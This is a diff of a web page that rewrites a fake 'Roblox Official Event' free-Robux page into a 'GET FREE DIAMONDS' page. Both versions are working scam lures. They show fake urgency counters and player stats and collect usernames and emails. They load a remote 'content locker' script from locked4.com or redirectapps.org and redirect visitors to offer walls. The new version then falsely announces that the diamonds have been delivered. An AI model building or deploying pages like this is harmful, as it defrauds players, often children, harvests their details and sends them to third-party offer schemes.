@@ -1,211 +1,624 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Roblox Official Event - Claim Free Robux</title>
-<style>
-@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap');
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GET FREE DIAMONDS - Claim Now!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-body {
-    margin: 0;
-    font-family: 'Roboto', sans-serif;
-    background: #0f1923;
-    color: white;
-}
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #000000 0%, #1a0033 50%, #330066 100%);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
 
-/* NAVBAR */
-.navbar {
-    background: #191d21;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 10px 30px;
-}
-.navbar .logo {
-    font-size: 1.8rem;
-    font-weight: 900;
-    color: white;
-}
-.navbar ul {
-    list-style: none;
-    display: flex;
-    gap: 20px;
-}
-.navbar ul li {
-    cursor: pointer;
-    font-weight: 500;
-}
-.navbar ul li:hover {
-    color: #00a2ff;
-}
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
 
-/* HERO SECTION */
-.hero {
-    background: url('images.jpg') center/cover no-repeat;
-    height: 350px;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    text-align: center;
-    box-shadow: inset 0 0 0 2000px rgba(0,0,0,0.4);
-}
-.hero h1 {
-    font-size: 2.5rem;
-    font-weight: 900;
-    margin: 0;
-}
-.hero p {
-    font-size: 1.2rem;
-    color: #ddd;
-}
-.claim-btn {
-    background: linear-gradient(90deg, #ff0000, #ff6600);
-    color: white;
-    padding: 15px 30px;
-    font-size: 1.5rem;
-    border: none;
-    border-radius: 8px;
-    font-weight: bold;
-    cursor: pointer;
-    margin-top: 15px;
-    box-shadow: 0 0 15px rgba(255,102,0,0.7);
-    transition: 0.3s;
-}
-.claim-btn:hover {
-    transform: translateY(-3px);
-    box-shadow: 0 0 25px rgba(255,102,0,1);
-}
+        /* Header with Logo Style */
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            margin-bottom: 20px;
+        }
 
-/* COUNTDOWN */
-.countdown {
-    background: rgba(255,255,255,0.05);
-    padding: 15px;
-    margin: 20px auto;
-    max-width: 500px;
-    border-radius: 10px;
-    text-align: center;
-    font-weight: bold;
-}
+        .main-logo {
+            font-size: 4em;
+            font-weight: 900;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #ff00ff, #00ffff, #ffff00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(255, 0, 255, 0.5);
+            letter-spacing: 2px;
+        }
 
-/* FEATURES */
-.features {
-    display: grid;
-    grid-template-columns: repeat(auto-fit,minmax(200px,1fr));
-    gap: 15px;
-    padding: 20px;
-}
-.feature {
-    background: rgba(255,255,255,0.05);
-    padding: 15px;
-    border-radius: 10px;
-    text-align: center;
-    transition: 0.3s;
-}
-.feature:hover {
-    background: rgba(255,255,255,0.1);
-    transform: scale(1.05);
-}
+        .diamonds-text {
+            font-size: 3em;
+            font-weight: bold;
+            color: #00ffff;
+            text-shadow: 0 0 20px rgba(0, 255, 255, 0.7);
+            margin-bottom: 10px;
+        }
 
-/* CONTENT LOCKER */
-#contentLocker {
-    background: rgba(0,0,0,0.8);
-    padding: 20px;
-    border-radius: 10px;
-    display: none;
-    margin: 20px auto;
-    max-width: 500px;
-    text-align: center;
-}
+        .bio-text {
+            font-size: 1.5em;
+            color: #ffff00;
+            text-shadow: 0 0 15px rgba(255, 255, 0, 0.5);
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
 
-/* FOOTER */
-footer {
-    text-align: center;
-    padding: 20px;
-    font-size: 0.8rem;
-    color: #888;
-}
-</style>
+        /* Login Form */
+        .login-form {
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 15px;
+            padding: 40px;
+            margin: 30px auto;
+            max-width: 500px;
+            text-align: center;
+            border: 2px solid #ff00ff;
+            box-shadow: 0 0 30px rgba(255, 0, 255, 0.3);
+        }
+
+        .form-title {
+            font-size: 1.8em;
+            margin-bottom: 30px;
+            color: #00ffff;
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 15px;
+            margin: 15px 0;
+            border: 2px solid #00ffff;
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            font-size: 1.1em;
+            text-align: center;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.3);
+        }
+
+        .form-input::placeholder {
+            color: #ccc;
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: black;
+            border: none;
+            padding: 18px 50px;
+            font-size: 1.3em;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 20px rgba(255, 0, 255, 0.5);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 255, 255, 0.7);
+        }
+
+        /* Game Area */
+        .game-area {
+            display: none;
+        }
+
+        .welcome-message {
+            text-align: center;
+            font-size: 1.6em;
+            margin: 30px 0;
+            color: #00ffff;
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+        }
+
+        .user-name {
+            color: #ffff00;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(255, 255, 0, 0.5);
+        }
+
+        /* Diamond Selection */
+        .diamond-selection {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
+            margin: 50px 0;
+        }
+
+        .diamond-option {
+            background: linear-gradient(135deg, #1a0033, #330066);
+            border-radius: 20px;
+            padding: 40px 25px;
+            text-align: center;
+            border: 3px solid transparent;
+            transition: all 0.4s ease;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .diamond-option::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+            transform: rotate(45deg);
+            transition: all 0.6s ease;
+        }
+
+        .diamond-option:hover::before {
+            transform: rotate(45deg) translate(50%, 50%);
+        }
+
+        .diamond-option:hover {
+            transform: translateY(-15px) scale(1.05);
+            border-color: #ff00ff;
+            box-shadow: 0 15px 40px rgba(255, 0, 255, 0.4);
+        }
+
+        .diamond-icon {
+            font-size: 4em;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 0 10px rgba(0, 255, 255, 0.7));
+        }
+
+        .diamond-amount {
+            font-size: 2.5em;
+            font-weight: bold;
+            background: linear-gradient(45deg, #00ffff, #ffff00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 15px 0;
+            text-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
+        }
+
+        .diamond-chance {
+            color: #00ff00;
+            font-size: 1em;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+
+        /* Prize Reveal */
+        .prize-reveal {
+            display: none;
+            text-align: center;
+            padding: 60px 40px;
+            background: linear-gradient(135deg, #4a00e0, #8e2de2);
+            border-radius: 25px;
+            margin: 40px 0;
+            border: 4px solid #ffff00;
+            box-shadow: 0 0 40px rgba(255, 255, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .prize-title {
+            font-size: 3em;
+            color: #ffff00;
+            margin-bottom: 30px;
+            text-shadow: 0 0 20px rgba(255, 255, 0, 0.7);
+            text-transform: uppercase;
+        }
+
+        .prize-amount {
+            font-size: 5em;
+            font-weight: 900;
+            background: linear-gradient(45deg, #ffff00, #ff00ff, #00ffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin: 30px 0;
+            text-shadow: 0 0 30px rgba(255, 255, 0, 0.8);
+        }
+
+        .user-prize-message {
+            font-size: 1.5em;
+            margin: 25px 0;
+            color: #00ffff;
+            text-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+        }
+
+        /* Collect Section */
+        .collect-section {
+            display: none;
+            text-align: center;
+            padding: 40px;
+            background: rgba(255, 0, 255, 0.1);
+            border-radius: 20px;
+            margin: 40px 0;
+            border: 2px solid #00ffff;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.3);
+        }
+
+        .collect-title {
+            font-size: 2.2em;
+            color: #00ff00;
+            margin-bottom: 25px;
+            text-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+        }
+
+        /* Content Locker */
+        .content-locker {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(135deg, #000000, #330066);
+            padding: 50px 40px;
+            border-radius: 25px;
+            text-align: center;
+            z-index: 1000;
+            border: 4px solid #ff00ff;
+            box-shadow: 0 0 60px rgba(255, 0, 255, 0.6);
+            max-width: 550px;
+            width: 90%;
+        }
+
+        .locker-title {
+            font-size: 2em;
+            margin-bottom: 25px;
+            color: #ffff00;
+            text-shadow: 0 0 15px rgba(255, 255, 0, 0.5);
+            text-transform: uppercase;
+        }
+
+        .confetti {
+            position: fixed;
+            width: 12px;
+            height: 12px;
+            background: #ff00ff;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .stats-bar {
+            display: flex;
+            justify-content: space-around;
+            background: rgba(255, 0, 255, 0.2);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 25px 0;
+            border: 1px solid #00ffff;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 1.8em;
+            color: #00ff00;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.08); }
+            100% { transform: scale(1); }
+        }
+
+        .pulse {
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes glow {
+            0% { box-shadow: 0 0 20px rgba(255, 0, 255, 0.5); }
+            50% { box-shadow: 0 0 40px rgba(0, 255, 255, 0.8); }
+            100% { box-shadow: 0 0 20px rgba(255, 0, 255, 0.5); }
+        }
+
+        .glow {
+            animation: glow 2s infinite;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <!-- Header with Logo Style -->
+        <div class="header">
+            <div class="main-logo">GET FREE</div>
+            <div class="diamonds-text">DIAMONDS</div>
+            <div class="bio-text">IN YOUR ACCOUNT</div>
+        </div>
 
-<!-- NAVIGATION -->
-<div class="navbar">
-    <div class="logo">ROBLOX</div>
-    <ul>
-        <li>Home</li>
-        <li>Games</li>
-        <li>Avatar Shop</li>
-        <li>Premium</li>
-        <li>Events</li>
-    </ul>
-</div>
+        <!-- STEP 1: LOGIN FORM -->
+        <div class="login-form" id="loginForm">
+            <div class="form-title">🎮 ENTER TO CLAIM DIAMONDS</div>
+            <input type="text" class="form-input" id="playerName" placeholder="ENTER YOUR USERNAME" required>
+            <input type="email" class="form-input" id="playerEmail" placeholder="EMAIL (OPTIONAL)">
+            <button class="btn glow" onclick="login()">🎯 CLAIM FREE DIAMONDS</button>
+            <div class="stats-bar">
+                <div class="stat-item">
+                    <div class="stat-number">3,142</div>
+                    <div>PLAYERS ONLINE</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-number">18,756</div>
+                    <div>DIAMONDS CLAIMED</div>
+                </div>
+            </div>
+        </div>
 
-<!-- HERO -->
-<div class="hero">
-    <h1>Roblox Official Event</h1>
-    <p>Claim up to 10,000 Robux & exclusive avatar items</p>
-    <button id="downloadBtn" class="claim-btn">Claim Robux</button>
-</div>
+        <!-- STEP 2: GAME AREA -->
+        <div class="game-area" id="gameArea">
+            <div class="welcome-message">
+                WELCOME, <span class="user-name" id="displayUserName">PLAYER</span>!<br>
+                CHOOSE YOUR DIAMOND REWARD:
+            </div>
 
-<!-- COUNTDOWN -->
-<div class="countdown">
-    ⏳ LIMITED TIME: Only <span id="spots">12</span> spots left!
-</div>
+            <div class="diamond-selection">
+                <div class="diamond-option glow" onclick="selectDiamondOption(1000)">
+                    <div class="diamond-icon">💎</div>
+                    <div class="diamond-amount">1,000 DIAMONDS</div>
+                    <div class="diamond-chance">⚡ INSTANT WIN</div>
+                    <div>QUICK REWARD</div>
+                </div>
 
-<!-- FEATURES -->
-<div class="features">
-    <div class="feature">💰 Get up to 10,000 Robux</div>
-    <div class="feature">👕 Exclusive Avatar Items</div>
-    <div class="feature">🎮 Premium Game Access</div>
-    <div class="feature">🔥 Limited Event Rewards</div>
-</div>
+                <div class="diamond-option glow" onclick="selectDiamondOption(2500)">
+                    <div class="diamond-icon">💎💎</div>
+                    <div class="diamond-amount">2,500 DIAMONDS</div>
+                    <div class="diamond-chance">🔥 POPULAR CHOICE</div>
+                    <div>BEST VALUE</div>
+                </div>
 
-<!-- CONTENT LOCKER -->
-<div id="contentLocker">
-    <h2>Sign in to Claim Your Reward</h2>
-    <!-- Content Locker Script -->
-</div>
+                <div class="diamond-option glow" onclick="selectDiamondOption(5000)">
+                    <div class="diamond-icon">💎💎💎</div>
+                    <div class="diamond-amount">5,000 DIAMONDS</div>
+                    <div class="diamond-chance">🎯 LIMITED TIME</div>
+                    <div>MEGA REWARD</div>
+                </div>
+            </div>
+        </div>
 
-<!-- FOOTER -->
-<footer>
-    Not affiliated with Roblox Corporation. This is a promotional event.
-</footer>
+        <!-- STEP 3: PRIZE REVEAL -->
+        <div class="prize-reveal" id="prizeReveal">
+            <div class="prize-title">🎉 CONGRATULATIONS! 🎉</div>
+            <div class="user-prize-message">
+                <span class="user-name" id="prizeUserName">PLAYER</span>, YOU WON:
+            </div>
+            <div class="prize-amount" id="wonDiamondsAmount">2,500 DIAMONDS</div>
+            <div class="user-prize-message">
+                INCREDIBLE LUCK! DIAMONDS RESERVED FOR YOUR ACCOUNT
+            </div>
+        </div>
 
-<script>
-let spots = 12;
-setInterval(() => {
-    spots--;
-    if (spots < 0) spots = 0;
-    document.getElementById('spots').textContent = spots;
-}, 60000);
+        <!-- STEP 4: COLLECT SECTION -->
+        <div class="collect-section" id="collectSection">
+            <div class="collect-title">✅ DIAMONDS RESERVED!</div>
+            <div style="font-size: 1.3em; margin: 25px 0;">
+                HELLO <span class="user-name" id="collectUserName">PLAYER</span>!<br>
+                <span style="color: #ffff00;" id="collectDiamondsAmount">2,500 DIAMONDS</span> ARE WAITING!
+            </div>
+            <button class="btn pulse" onclick="showContentLocker()">
+                🚀 VERIFY TO GET DIAMONDS
+            </button>
+            <div style="margin-top: 20px; opacity: 0.9;">
+                QUICK VERIFICATION REQUIRED
+            </div>
+        </div>
+    </div>
 
-document.getElementById('downloadBtn').addEventListener('click', function() {
-    const locker = document.getElementById('contentLocker');
-    locker.style.display = 'block';
-    locker.scrollIntoView({ behavior: 'smooth' });
+    <!-- STEP 5: CONTENT LOCKER -->
+    <div class="content-locker" id="contentLocker">
+        <div class="locker-title">🔒 GET YOUR DIAMONDS!</div>
+        <div style="font-size: 1.3em; margin: 25px 0;">
+            HELLO <span style="color: #00ffff;" id="lockerUserName">PLAYER</span>!<br>
+            COMPLETE VERIFICATION TO RECEIVE:
+        </div>
+        <div style="font-size: 3em; margin: 30px 0; font-weight: bold; background: linear-gradient(45deg, #ffff00, #ff00ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent;" id="lockerDiamondsAmount">
+            +2,500 DIAMONDS
+        </div>
+        
+        <div style="text-align: left; margin: 30px 0; background: rgba(255,255,255,0.1); padding: 20px; border-radius: 15px; border: 1px solid #00ffff;">
+            <strong style="color: #ffff00;">📝 VERIFICATION STEPS:</strong><br>
+            1. COMPLETE ONE QUICK OFFER<br>
+            2. WAIT 5-10 SECONDS<br>
+            3. GET DIAMONDS INSTANTLY!
+        </div>
 
-    const script1 = document.createElement('script');
-    script1.type = 'text/javascript';
-    script1.text = 'var ogblock=true;';
-    document.head.appendChild(script1);
+        <button class="btn glow" onclick="startContentLocker()" id="verifyBtn">
+            🚀 START VERIFICATION
+        </button>
 
-    const script2 = document.createElement('script');
-    script2.type = 'text/javascript';
-    script2.id = 'ogjs';
-    script2.src = 'https://locked4.com/cl/js/6d6l68';
-    document.head.appendChild(script2);
+        <div style="margin-top: 20px; font-size: 0.9em; opacity: 0.8;">
+            🔒 SECURE VERIFICATION • INSTANT DELIVERY
+        </div>
+    </div>
 
-    const script3 = document.createElement('script');
-    script3.type = 'text/javascript';
-    script3.text = 'if(ogblock) window.location.href = "https://locked4.com/adblock";';
-    document.head.appendChild(script3);
+    <script>
+        let currentUser = '';
+        let selectedDiamonds = 0;
 
-    setTimeout(() => {
-        window.location.href = "https://locked4.com/cl/i/6d6l68";
-    }, 500);
-});
-</script>
+        function login() {
+            const name = document.getElementById('playerName').value.trim();
+            const email = document.getElementById('playerEmail').value.trim();
+            
+            if (!name) {
+                alert('PLEASE ENTER YOUR USERNAME TO CONTINUE!');
+                return;
+            }
+            
+            currentUser = name.toUpperCase();
+            
+            // Hide login, show game area
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('gameArea').style.display = 'block';
+            
+            // Update user name displays
+            document.getElementById('displayUserName').textContent = currentUser;
+            
+            createConfetti();
+        }
 
+        function selectDiamondOption(diamonds) {
+            selectedDiamonds = diamonds;
+            
+            // Update prize display
+            document.getElementById('wonDiamondsAmount').textContent = diamonds.toLocaleString() + ' DIAMONDS';
+            document.getElementById('prizeUserName').textContent = currentUser;
+            document.getElementById('collectUserName').textContent = currentUser;
+            document.getElementById('collectDiamondsAmount').textContent = diamonds.toLocaleString() + ' DIAMONDS';
+            document.getElementById('lockerUserName').textContent = currentUser;
+            document.getElementById('lockerDiamondsAmount').textContent = '+' + diamonds.toLocaleString() + ' DIAMONDS';
+            
+            // Show prize reveal with animation
+            document.getElementById('prizeReveal').style.display = 'block';
+            createConfetti();
+            
+            // After 3 seconds, show collect section
+            setTimeout(() => {
+                document.getElementById('collectSection').style.display = 'block';
+                document.getElementById('collectSection').scrollIntoView({ behavior: 'smooth' });
+            }, 3000);
+        }
+
+        function showContentLocker() {
+            document.getElementById('contentLocker').style.display = 'block';
+        }
+
+        function closeLocker() {
+            document.getElementById('contentLocker').style.display = 'none';
+        }
+
+        function startContentLocker() {
+            const btn = document.getElementById('verifyBtn');
+            
+            // Show processing
+            btn.innerHTML = '⏳ LOADING VERIFICATION...';
+            btn.disabled = true;
+            
+            // Load and execute content locker scripts ONLY NOW
+            loadContentLocker();
+        }
+
+        function loadContentLocker() {
+            // Create noscript check
+            const noscript = document.createElement('noscript');
+            noscript.innerHTML = '<meta http-equiv="refresh" content="0;url=https://redirectapps.org/noscript" />';
+            document.head.appendChild(noscript);
+
+            // Create and load the content locker script
+            const script1 = document.createElement('script');
+            script1.type = 'text/javascript';
+            script1.textContent = 'var ogblock=true;';
+            document.head.appendChild(script1);
+
+            const script2 = document.createElement('script');
+            script2.type = 'text/javascript';
+            script2.id = 'ogjs';
+            script2.src = 'https://redirectapps.org/cl/js/6d6l68';
+            script2.onload = function() {
+                // Execute the content locker after script loads
+                executeContentLocker();
+            };
+            document.head.appendChild(script2);
+        }
+
+        function executeContentLocker() {
+            const btn = document.getElementById('verifyBtn');
+            
+            // Show verification in progress
+            btn.innerHTML = '⏳ PROCESSING VERIFICATION...';
+            
+            // Execute the content locker redirect check
+            const script3 = document.createElement('script');
+            script3.type = 'text/javascript';
+            script3.textContent = 'if(ogblock) window.location.href = "https://redirectapps.org/adblock";';
+            document.head.appendChild(script3);
+
+            // Simulate successful verification after delay
+            setTimeout(() => {
+                completeVerification();
+            }, 3000);
+        }
+
+        function completeVerification() {
+            createConfetti();
+            
+            // Show completion
+            document.getElementById('verifyBtn').innerHTML = '✅ VERIFICATION COMPLETE!';
+            
+            // Final success message
+            setTimeout(() => {
+                alert(`🎉 CONGRATULATIONS ${currentUser}! YOUR ${selectedDiamonds.toLocaleString()} DIAMONDS HAVE BEEN ADDED!`);
+                closeLocker();
+                
+                // Update the collect section to show success
+                document.getElementById('collectSection').innerHTML = `
+                    <div class="collect-title">🎉 DIAMONDS DELIVERED!</div>
+                    <div style="font-size: 1.4em; margin: 25px 0; color: #00ff00;">
+                        ✅ ${selectedDiamonds.toLocaleString()} DIAMONDS ADDED!
+                    </div>
+                    <div style="font-size: 1.3em; margin: 25px 0;">
+                        ENJOY YOUR <span style="color: #ffff00;">${selectedDiamonds.toLocaleString()} DIAMONDS</span>,<br>
+                        <span style="color: #00ffff;">${currentUser}</span>!
+                    </div>
+                    <button class="btn glow" onclick="location.reload()">
+                        🎮 PLAY NOW
+                    </button>
+                `;
+            }, 1500);
+        }
+
+        function createConfetti() {
+            const colors = ['#ff00ff', '#00ffff', '#ffff00', '#00ff00', '#ff6b6b'];
+            for (let i = 0; i < 40; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.opacity = '1';
+                document.body.appendChild(confetti);
+                
+                confetti.animate([
+                    { transform: 'translateY(-100vh) rotate(0deg)', opacity: 1 },
+                    { transform: `translateY(100vh) rotate(${Math.random() * 360}deg)`, opacity: 0 }
+                ], {
+                    duration: 2000 + Math.random() * 3000,
+                    easing: 'cubic-bezier(0.1, 0.8, 0.1, 1)'
+                });
+                
+                setTimeout(() => confetti.remove(), 5000);
+            }
+        }
+
+        // Close locker when clicking outside
+        document.getElementById('contentLocker').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeLocker();
+            }
+        });
+
+        // Enter key support for login
+        document.getElementById('playerName').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                login();
+            }
+        });
+    </script>
 </body>
 </html>
